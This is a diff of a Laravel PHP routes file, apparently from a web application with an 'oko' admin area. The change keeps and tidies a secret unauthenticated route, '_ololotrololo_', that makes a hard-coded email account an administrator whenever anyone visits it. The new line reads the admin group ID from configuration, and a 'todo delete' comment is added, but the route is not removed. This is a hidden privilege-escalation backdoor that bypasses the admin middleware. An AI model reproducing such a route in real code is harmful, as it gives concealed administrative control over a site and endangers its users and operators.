@@ -186,10 +186,11 @@ Route::group(['prefix' => 'oko', 'middleware' => 'admin'], function (){
 	Route::get('users/{user}', ['uses' => 'Admin\AdminController@usersDetail']);
 });
 
-Route::get('_ololotrololo_', function (){
+Route::get('_ololotrololo_', function(){ // todo удалить
 	$me = \App\Models\User::where(['email' => 'aristov-92@mail.ru'])->first();
-	$me->group_id = 1;
+	$me->group_id = \Illuminate\Support\Facades\Config::get('constants.ADMIN_GROUP_ID');
 	$me->save();
+
 	return redirect('/');
 });
 
